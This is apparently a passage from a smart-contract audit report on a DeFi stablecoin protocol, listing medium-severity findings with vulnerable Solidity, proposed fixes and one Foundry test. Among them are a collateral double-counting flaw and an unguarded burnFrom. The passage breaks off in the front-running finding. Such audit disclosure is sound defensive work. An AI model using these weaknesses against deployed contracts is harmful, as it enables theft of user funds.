[pks27](/profile/clkc1tqhb0000jt08tz2r0wmq), [0xbugalba](/team/clkff1bat0001k4082yo3xy8j), [0xsandy](/profile/clk43kus5009imb0830ko7dxy), [smbv1923](/profile/clkp51djq001amy08d2e1slqf), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [fouzantanveer](/profile/clkutlyji000olc09j81zek7d), [Deathstore](/profile/clkglvxbj0006ms089kunsfuw), [klaus](/profile/clkwlspwi002sk008f6i0bjvu), [vic43](/profile/clkx55fzt0008l408wtdumivr), [Tripathi](/profile/clk3xe9tk0024l808xjc9wkg4), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [nervouspika](/profile/clk8s260t000el108iz3yrkhy), [xfu](/profile/clke2oift0000l508j03apihy), [Avci](/profile/clkx1zq3i0018mq09o6h33o7o), [alexzoid](/profile/clk41t0lv006kla08p69ueiel), [tsar](/profile/clk9isayj0004l30847ln1e8j). Selected submission by: [Aamirusmani1552](/profile/clk6yhrt6000gmj082jnn4770)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main

## Summary
Chainlink aggregators have a built-in circuit breaker if the price of an asset goes outside of a predetermined price band.

The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the `minPrice` instead of the actual price of the asset and vice versa.

## Vulnerability Details
The `staleCheckLatestRoundData` function in `OracleLib.sol` is only checking for the stale price. But no checks are done to handle that.

```solidity
 function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
        if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```
[[21](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L21C4-L33C6)]

There is no function for checking only this as well in the library.
The checks are not done in `DSCEngine.sol` file.
There are two instances of that:
```solidity
        (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
```
[[345](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L345)]

```solidity
        (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
```
[[363](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L363)]

## Impact
This would allow users to continue mintDsc, burnDsc etc. but at the wrong price. This is exactly what happened to Venus on BSC when LUNA crashed.

## Tools Used
chainlink docs, foundry test and previous audit reports

## Recommendations
Consider using the following checks: 
```solidity
(uint80, int256 answer, uint, uint, uint80) = oracle.latestRoundData();

// minPrice check
require(answer > minPrice, "Min price exceeded");
// maxPrice check
require(answer < maxPrice, "Max price exceeded");
```

Also some gas could be saved when used `revert` with custom `error` for doing the check.
## <a id='M-04'></a>M-04. All of the USD pair price feeds doesn't have 8 decimals

_Submitted by [BAHOZ](/profile/clk80h9bl000ml6087ltct76r), [dacian](/profile/clk6xnjxv0008jy083fc2mhsb), [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [Madalad](/profile/clki3uj3i0000l508carwkhuh), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [0xAadhi](/profile/clk75injq0004l908x4ygb7bp), [jprod15](/profile/clk71ssjy0004jt08zj3l9hui), [Lalanda](/profile/clk44x5d0002amg08cqme5xh6), [lian886](/profile/clk6rtfkx0008mn083rima8eb), [nisedo](/profile/clk3saar60000l608gsamuvnw), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [jonatascm](/profile/clk83zqs2000gjp08eg935k0n), [pengun](/profile/clkkjed3v0004mj08gpw0u7b2), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [sm4rty](/profile/clk4170ln003amb088n137st7), [ADM](/profile/clk4kalbm0008l508td2elpga), [0xhuy0512](/profile/clk80hto50004m908dr18akv7), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [0xtotem](/profile/clks3roo7002gme08whr1p19b), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [SBSecurity](/team/clkuz8xt7001vl608nphmevro), [mahyar](/profile/clkpvim480008l408w11mlv63), [cRat1st0s](/profile/clk40jnqb003ela082lym3lj7), [aak](/profile/clk9kvsmw000aih08ru3t39en), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [Tripathi](/profile/clk3xe9tk0024l808xjc9wkg4), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [Kresh](/profile/clk793io00000mq08mnijuadg), [tsar](/profile/clk9isayj0004l30847ln1e8j). Selected submission by: [mahyar](/profile/clkpvim480008l408w11mlv63)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L340-L348

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L361-L367

## Summary

`DSCEngine` contract assumes all of the USD pair chinlink price feeds have 8 decimals but there are certain token's USD feed has a different decimals

## Vulnerability Details

In the [`getTokenAmountFromUsd`](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L340-L348) and [`getUsdValue`](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L361-L367) functions price of tokens are calculated with chainlink price feeds and the function assumed that all of USD pairs has 8 decimals but there are certain tokens which they have different decimals.

For example [AMPL / USD feed](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706#readContract) has 18 decimals
 
So if some tokens's price feed has not 8 decimals it will break a lots of things in the contract

## Impact

Since returned value of this two functions is used for health factor and liquidation process it will cause loss of funds for users and protocol

## Tools Used

Manual Analysis

## Recommendations
Consider calling `decimals()` function on the price feed contract to get the correct decimals and calculate the value based on the returned decimals

```diff
    function getTokenAmountFromUsd(address token, uint256 usdAmountInWei) public view returns (uint256) {
        // price of ETH (token)
        // $/ETH ETH ??
        // $2000 / ETH. $1000 = 0.5 ETH
        AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
        (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
        
+       uint8 decimals = priceFeed.decimals();
+       uint256 priceWithDecimals = (uint256(price) * 1e18) / (10 ** decimals);

-       return (usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION);
+       return (usdAmountInWei * PRECISION) / priceWithDecimals;        
    }


    function getUsdValue(address token, uint256 amount) public view returns (uint256) {
        AggregatorV3Interface priceFeed = AggregatorV3Interface(s_priceFeeds[token]);
        (, int256 price,,,) = priceFeed.staleCheckLatestRoundData();
        // 1 ETH = $1000
        // The returned value from CL will be 1000 * 1e8
+       uint8 decimals = priceFeed.decimals();
+       uint256 priceWithDecimals = (uint256(price) * 1e18) / (10 ** decimals);
-       return ((uint256(price) * ADDITIONAL_FEED_PRECISION) * amount) / PRECISION;
+       return (priceWithDecimals * amount) / PRECISION;
    }
``` 
## <a id='M-05'></a>M-05. Anyone can burn **DecentralizedStableCoin** tokens with `burnFrom` function

_Submitted by [BAHOZ](/profile/clk80h9bl000ml6087ltct76r), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [HollaDieWaldfee](/profile/clk80nhp8000km908ew0a2ccy), [Bughunter101](/profile/clkau4y560006l908gxfcec8y), [Rotcivegaf](/profile/clk3ziayk002ojq08apo5ojrt), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [ljj](/profile/clk3ttrj4001mib08qqu3vgk4), [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7), [lwltea](/profile/clk7224p9000ujt08g853wh48), [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8), [Qiezie](/profile/clk3vxv520010kx08lj3sw4ok), [klaus](/profile/clkwlspwi002sk008f6i0bjvu), [Tripathi](/profile/clk3xe9tk0024l808xjc9wkg4), [alexzoid](/profile/clk41t0lv006kla08p69ueiel), [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi). Selected submission by: [Rotcivegaf](/profile/clk3ziayk002ojq08apo5ojrt)._      
				


## Summary

Anyone can burn `DSC` tokens with [`burnFrom`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/0a25c1940ca220686588c4af3ec526f725fe2582/contracts/token/ERC20/extensions/ERC20Burnable.sol#L35-L38) function inherited of **OZ ERC20Burnable** contract

## Vulnerability Details

In the **DecentralizedStableCoin** contract the `burn` function is `onlyOwner` and is used by **DSCEngine** contract, which is the owner of **DecentralizedStableCoin** contract

## Impact

The tokens can be burned with `burnFrom` function bypassing the `onlyOwner` modifier of the `burn` functions

## Recommendations

Block the `burnFrom` function of **OZ ERC20Burnable** contract

```solidity
@@ -40,6 +40,7 @@ contract DecentralizedStableCoin is ERC20Burnable, Ownable {
     error DecentralizedStableCoin__MustBeMoreThanZero();
     error DecentralizedStableCoin__BurnAmountExceedsBalance();
     error DecentralizedStableCoin__NotZeroAddress();
+    error DecentralizedStableCoin__BlockFunction();

     constructor() ERC20("DecentralizedStableCoin", "DSC") {}

@@ -54,6 +55,10 @@ contract DecentralizedStableCoin is ERC20Burnable, Ownable {
         super.burn(_amount);
     }

+    function burnFrom(address, uint256) public pure override {
+        revert DecentralizedStableCoin__BlockFunction();
+    }
+
     function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
         if (_to == address(0)) {
             revert DecentralizedStableCoin__NotZeroAddress();
```
## <a id='M-06'></a>M-06. Double-spending vulnerability leads to a disruption of the DSC token

_Submitted by [StErMi](/profile/clk579hcp0014l508ybc3ec6z), [1nc0gn170](/profile/clk9zehwa0000l508h5rx35pc), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh), [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi), [Y403L](/profile/clk451ae6001gl908aibvhwv9), [RugpullDetector](/profile/clknpmzwp0014l608wk9hflu6), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [pontifex](/profile/clk3xo3e0000omm08i6ehw2ae), [klaus](/profile/clkwlspwi002sk008f6i0bjvu). Selected submission by: [serialcoder](/profile/clkb309g90008l208so2bzcy6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L120

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L353-L357

## Summary

There is a double-spending vulnerability in the `DSCEngine` contract, leading to a disruption of the DSC token.

## Vulnerability Details

While constructing the `DSCEngine` contract, the whitelisted collateral tokens will be registered along with their corresponding price feed addresses. However, the registration process does not verify that a token cannot be registered twice. 

For instance, assume that the ETH address is inputted in the array `tokenAddresses` twice, the ETH address will also be pushed into the array `s_collateralTokens` twice.

```solidity
    constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
        // USD Price Feeds
        if (tokenAddresses.length != priceFeedAddresses.length) {
            revert DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength();
        }
        // For example ETH / USD, BTC / USD, MKR / USD, etc
        for (uint256 i = 0; i < tokenAddresses.length; i++) {
            s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
@>          s_collateralTokens.push(tokenAddresses[i]);
        }
        i_dsc = DecentralizedStableCoin(dscAddress);
    }
```
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L120

Subsequently, when the contract executes the `getAccountCollateralValue()` to compute users' collateral value, the function will process on the ETH address twice. In other words, if a user/attacker deposits 10 ETH as collateral, the `getAccountCollateralValue()` will return 20 ETH (in USD value), leading to a double-spending issue.

```solidity
    function getAccountCollateralValue(address user) public view returns (uint256 totalCollateralValueInUsd) {
        // loop through each collateral token, get the amount they have deposited, and map it to
        // the price, to get the USD value
@>      for (uint256 i = 0; i < s_collateralTokens.length; i++) {
@>          address token = s_collateralTokens[i];
@>          uint256 amount = s_collateralDeposited[user][token];
@>          totalCollateralValueInUsd += getUsdValue(token, amount);
@>      }
        return totalCollateralValueInUsd;
    }
```
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L353-L357

## Impact

With this double-spending vulnerability, an attacker can deposit ETH to double their collateral value and then mint DSC tokens over the limit (breaking the protocol's health factor invariant).

As a result, the `DSCEngine` contract will eventually be insolvent, and the DSC token will then be depegged to $0.

## Tools Used

Manual Review

## Recommendations

To fix the vulnerability, I recommend adding the `require(s_priceFeeds[tokenAddresses[i]] == address(0), "Collateral token was already set");` to guarantee that there could not be any token ever registered twice.

```diff
    constructor(address[] memory tokenAddresses, address[] memory priceFeedAddresses, address dscAddress) {
        // USD Price Feeds
        if (tokenAddresses.length != priceFeedAddresses.length) {
            revert DSCEngine__TokenAddressesAndPriceFeedAddressesMustBeSameLength();
        }
        // For example ETH / USD, BTC / USD, MKR / USD, etc
        for (uint256 i = 0; i < tokenAddresses.length; i++) {
+           require(s_priceFeeds[tokenAddresses[i]] == address(0), "Collateral token was already set");
            s_priceFeeds[tokenAddresses[i]] = priceFeedAddresses[i];
            s_collateralTokens.push(tokenAddresses[i]);
        }
        i_dsc = DecentralizedStableCoin(dscAddress);
    }
```
## <a id='M-07'></a>M-07. Lack of fallbacks for price feed oracle

_Submitted by [dacian](/profile/clk6xnjxv0008jy083fc2mhsb), [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [JohnLaw](/profile/clk4b3vtt001ald08ew8go29n), [0xSmartContract](/profile/clkfyyoms0006jx08k30qx5nb), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5), [BenRai](/profile/clkksmnp8000sla08ob285wxl), [0xRizwan](/profile/clk7o7bq3000ome08az33iib2), [P12473](/profile/clk6kv9cw000kld08aoojapp0), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [Bauer](/profile/clkq7w3kv00awmr08rw8dmi8o), [AlexCzm](/profile/clk7gew0m000gmi08sgbhts35), [sashiketh](/profile/clk8he27t000eia082f6talni), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [alexzoid](/profile/clk41t0lv006kla08p69ueiel), [0xPublicGoods](/profile/clk56xif80002l208nv5vsvln). Selected submission by: [serialcoder](/profile/clkb309g90008l208so2bzcy6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L26-L27

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30

## Summary

The DSC protocol does not implement fallback solutions for price feed oracle. In case Chainlink's aggregators fail to update price data, the protocol will refuse to liquidate users' positions, leading to the protocol's disruption.

## Vulnerability Details

The DSC protocol utilizes the `staleCheckLatestRoundData()` for querying price data of collateral tokens through [Chainlink's price feed aggregators](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L26-L27). Nonetheless, if Chainlink's aggregators fail to update the price data, the DSC protocol will not be able to operate. In other words, [the function will revert transactions since the received price data become stale](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30).

```solidity
    function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
@>      (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
@>          priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
@>      if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```

- `Chainlink's price feed aggregator`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L26-L27

- `TX will be reverted if the received price is stale`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30

## Impact

Without fallback solutions, the DSC protocol will be unable to operate if Chainlink's aggregators fail to update price data. 

Consider the scenario that Chainlink's aggregators fail to update price data and collateral tokens' prices dramatically go down, the DSC protocol will refuse to liquidate users' positions. Consequently, the protocol will become insolvent eventually, leading to the protocol's disruption.

## Tools Used

Manual Review

## Recommendations

I recommend implementing fallback solutions, such as using other off-chain oracle providers and/or on-chain Uniswap's TWAP, for feeding price data in case Chainlink's aggregators fail.
## <a id='M-08'></a>M-08. Too many DSC tokens can get minted for fee-on-transfer tokens

_Submitted by [GoSoul22](/profile/clk7zkyd70002l608iam3ggtg), [Bobface](/profile/clk572bex000wl5082nhslxbq), [Madalad](/profile/clki3uj3i0000l508carwkhuh), [Breeje](/profile/clk41ow6c0066la0889fuw52t), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [Dliteofficial](/profile/clk40ntj2001mmb08zbxnflu4), [toshii](/profile/clkkffr6v0008mm0866fnnu0a), [ADM](/profile/clk4kalbm0008l508td2elpga), [Phantasmagoria](/profile/clki6y71n000gkx088cowa4hq), [P12473](/profile/clk6kv9cw000kld08aoojapp0), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [said017](/profile/clk3uzcop000ilb08pak3rnii), [tsvetanovv](/profile/clk3x0ilz001ol808l9uu6vpj), [ptsanev](/profile/clk41ds6d0056la0868j7rf0l), [ZanyBonzy](/profile/clk9uu45r0000js08lnm9zbez), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [RugpullDetector](/profile/clknpmzwp0014l608wk9hflu6), [No12Samurai](/profile/clk7mu64b000cme08wadtt1f6), [golanger85](/profile/clk9gmt880000mj08xc8hw7ng), [Deathstore](/profile/clkglvxbj0006ms089kunsfuw), [Kose](/profile/clk3whc2g0000mg08zp13lp1p), [Tripathi](/profile/clk3xe9tk0024l808xjc9wkg4), [xfu](/profile/clke2oift0000l508j03apihy), [alexzoid](/profile/clk41t0lv006kla08p69ueiel), [Kresh](/profile/clk793io00000mq08mnijuadg), [mau](/profile/clk9v1fgt0008mn08czddr9to), [tsar](/profile/clk9isayj0004l30847ln1e8j), [owade](/profile/clk9j4mf20002mi08k4758eni). Selected submission by: [Bobface](/profile/clk572bex000wl5082nhslxbq)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L149-L161

## Summary
The `DSCEngine` contract overcalculates the collateral when operating with fee-on-transfer tokens, which can lead to too many `DSC` tokens being minted.


## Vulnerability Details
The competition description mentions that while the first use-case for the system will be a WETH/WBTC backed stablecoin, the system is supposed to generally work with **any** collateral tokens. If one or more collateral tokens are fee-on-transfer tokens, i.e., when transferring `X` tokens, only `X - F` tokens arrive at the recipient side, where `F` denotes the transfer fee, depositors get credited too much collateral, meaning more `DSC` tokens can get minted, which leads to a potential depeg.

The root cause is the `depositCollateral` function in `DSCEngine`:

```solidity
function depositCollateral(address tokenCollateralAddress, uint256 amountCollateral)
        public
        moreThanZero(amountCollateral)
        isAllowedToken(tokenCollateralAddress)
        nonReentrant
    {
        s_collateralDeposited[msg.sender][tokenCollateralAddress] += amountCollateral;
        emit CollateralDeposited(msg.sender, tokenCollateralAddress, amountCollateral);
        bool success = IERC20(tokenCollateralAddress).transferFrom(msg.sender, address(this), amountCollateral);
        if (!success) {
            revert DSCEngine__TransferFailed();
        }
    }
```

As can be seen in line 
```solidity
bool success = IERC20(tokenCollateralAddress).transferFrom(msg.sender, address(this), amountCollateral);
````
the contract assumes that the full `amountCollateral` is received, which might not be the case with fee-on-transfer tokens.

## Impact
When the contract operates with fee-on-transfer tokens as collateral, too many `DSC` tokens can get minted based on the overcalculated collateral, potentially leading to a depeg.

## Tools Used
None

## Recommendations
Check the actual amount of received tokens:
```solidity
function depositCollateral(address tokenCollateralAddress, uint256 amountCollateral)
        public
        moreThanZero(amountCollateral)
        isAllowedToken(tokenCollateralAddress)
        nonReentrant
    {
        uint256 balanceBefore = IERC20(tokenCollateralAddress).balanceOf(address(this));
        bool success = IERC20(tokenCollateralAddress).transferFrom(msg.sender, address(this), amountCollateral);
        uint256 balanceAfter = IERC20(tokenCollateralAddress).balanceOf(address(this));
        amountCollateral = balanceAfter - balanceBefore;
        if (!success) {
            revert DSCEngine__TransferFailed();
        }
        s_collateralDeposited[msg.sender][tokenCollateralAddress] += amountCollateral;
        emit CollateralDeposited(msg.sender, tokenCollateralAddress, amountCollateral);
    }
```
## <a id='M-09'></a>M-09. `liquidate` does not allow the liquidator to liquidate a user if the liquidator HF < 1

_Submitted by [nisedo](/profile/clk3saar60000l608gsamuvnw), [StErMi](/profile/clk579hcp0014l508ybc3ec6z), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [iurii2002](/profile/clkjopcpe0020mb08ev4t85e5), [0x9527](/profile/clk6fywww000kk0089eqo3hem), [0xDanielH](/profile/clkkityt00000mj08mr89rdav), [Kresh](/profile/clk793io00000mq08mnijuadg). Selected submission by: [StErMi](/profile/clk579hcp0014l508ybc3ec6z)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L261

## Summary

The `liquidate` function does not allow the `liquidator` to liquidate the borrower if the `liquidatorHF < 1`. 

By liquidating a user, the liquidator is using his own funds that do not impact the liquidator HF directly. 

Because the function reverts, the system is preventing a user's to perform an action that should be able to do.

## Vulnerability Details

The `liquidate` function does not allow the `liquidator` to liquidate the borrower if the `liquidatorHF < 1`. 

By liquidating a user, the liquidator is using his own funds that do not impact the liquidator HF directly. 

Because the function reverts, the system is preventing a user's to perform an action that should be able to do.

## Impact

A liquidator cannot liquidate a user's debt when the liquidator's HF is below `1`. The system is preventing a user to perform an action that does not impact his own HF.

## Tools Used

Manual + foundry test

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {DSCEngine} from "../../src/DSCEngine.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";

contract CannotLiquidateWhenHFTest is StdCheats, Test {
    DSCEngine public dsce;
    DecentralizedStableCoin public dsc;
    HelperConfig public helperConfig;

    address[] public tokenAddresses;
    address[] public priceFeedAddresses;

    address public ethUsdPriceFeed;
    address public btcUsdPriceFeed;
    address public weth;
    address public wbtc;
    uint256 public deployerKey;

    uint256 amountCollateral = 10 ether;
    uint256 amountToMint = 100 ether;
    address public user = address(1);

    uint256 public constant STARTING_USER_BALANCE = 10 ether;
    uint256 public constant MIN_HEALTH_FACTOR = 1e18;
    uint256 public constant LIQUIDATION_THRESHOLD = 50;


    function setUp() external {
        helperConfig = new HelperConfig();

        (ethUsdPriceFeed, btcUsdPriceFeed, weth, wbtc, deployerKey) = helperConfig.activeNetworkConfig();

        tokenAddresses = [weth, wbtc];
        priceFeedAddresses = [ethUsdPriceFeed, btcUsdPriceFeed];

        dsc = new DecentralizedStableCoin();
        dsce = new DSCEngine(tokenAddresses, priceFeedAddresses, address(dsc));

        dsc.transferOwnership(address(dsce));

        if (block.chainid == 31337) {
            vm.deal(user, STARTING_USER_BALANCE);
        }
        
        ERC20Mock(weth).mint(user, STARTING_USER_BALANCE);
        ERC20Mock(wbtc).mint(user, STARTING_USER_BALANCE);
    }

function testLiquidateRevertIfLiquidatorHFBelow() public {
        vm.startPrank(user);
        ERC20Mock(weth).approve(address(dsce), amountCollateral);
        dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
        vm.stopPrank();

        // liquidator 
        address liquidator = makeAddr("liquidator");
        ERC20Mock(weth).mint(liquidator, STARTING_USER_BALANCE);

        vm.startPrank(liquidator);
        ERC20Mock(weth).approve(address(dsce), amountCollateral);
        dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
        vm.stopPrank();

        // now let's say that price goes down
        int256 ethUsdUpdatedPrice = 18e8; // 1 ETH = $18

        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(ethUsdUpdatedPrice);
        assertLt(dsce.getHealthFactor(user), 1e18);
        assertLt(dsce.getHealthFactor(liquidator), 1e18);


        // Liquidator try to liquidate 1 wei of user's debt but it will revert because of the check
        vm.startPrank(liquidator);
        dsc.approve(address(dsce), 1 ether);

        // system revert because `liquidator` has HF < 1
        vm.expectRevert();
        dsce.liquidate(weth, user, 1 ether);
        vm.stopPrank();


        vm.startPrank(liquidator);

        // Liquidator supply 1000 ether and supply them to have HF > 1
        ERC20Mock(weth).mint(liquidator, 1000 ether);
        ERC20Mock(weth).approve(address(dsce), 1000 ether);
        dsce.depositCollateral(weth, 1000 ether);

        
        uint256 liquidatorHFBefore = dsce.getHealthFactor(liquidator);
        assertGe(liquidatorHFBefore, 1e18);

        // perform liquidation again and prove that HF of liquidator does not change because of the liquidation itself
        dsc.approve(address(dsce), 1 ether);
        dsce.liquidate(weth, user, 1 ether);

        // The liquidator is using his own funds that do not impact the liquidator HF
        assertEq(dsce.getHealthFactor(liquidator), liquidatorHFBefore);
        vm.stopPrank();
    }
}
```

## Recommendations

The system should remove the check `_revertIfHealthFactorIsBroken(msg.sender);` in the `liquidate()` function, allowing a liquidator to always be able to liquidate a borrower.
## <a id='M-10'></a>M-10. Protocol can break for a token with a proxy and implementation contract (like `TUSD`)

_Submitted by [Madalad](/profile/clki3uj3i0000l508carwkhuh), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [Kose](/profile/clk3whc2g0000mg08zp13lp1p). Selected submission by: [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L112

## Summary
Tokens whose code and logic can be changed in future can break the protocol and lock user funds.

## Vulnerability Details
For a token like `TUSD` (supported by Chainlink TUSD/USD price feed), which has a proxy and implementation contract, if the implementation behind the proxy is changed, it can introduce features which break the protocol, like choosing to not return a bool on transfer(), or changing the balance over time like a rebasing token.

## Impact
Protocol may break in future for this collateral and block user funds deposited as collateral. Also can cause bad loans to be present with no way to liquidate them.

## Tools Used
Manual review

## Recommendations
- Developers integrating with upgradable tokens should consider introducing logic that will freeze interactions with the token in question if an upgrade is detected. (e.g. the [TUSD adapter](https://github.com/makerdao/dss-deploy/blob/7394f6555daf5747686a1b29b2f46c6b2c64b061/src/join.sol#L322) used by MakerDAO).
- OR have a token whitelist which does not allow such tokens.
## <a id='M-11'></a>M-11. Liquidators can be front-run to their loss

_Submitted by [Bauer](/profile/clkq7w3kv00awmr08rw8dmi8o), [kz0213871](/profile/clk9oqssu0008me08w56bq8n4), [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc). Selected submission by: [0xSwahili](/profile/clkkxnjij0000m808ykz18zsc)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229

## Summary
DSC liquidators are prone to oracle price manipulations and MEV front-run attacks
## Vulnerability Details
Sudden token price changes caused by oracle price manipulations and MEV front-run can cause liquidators to get less than expected collateral tokens.
## Impact
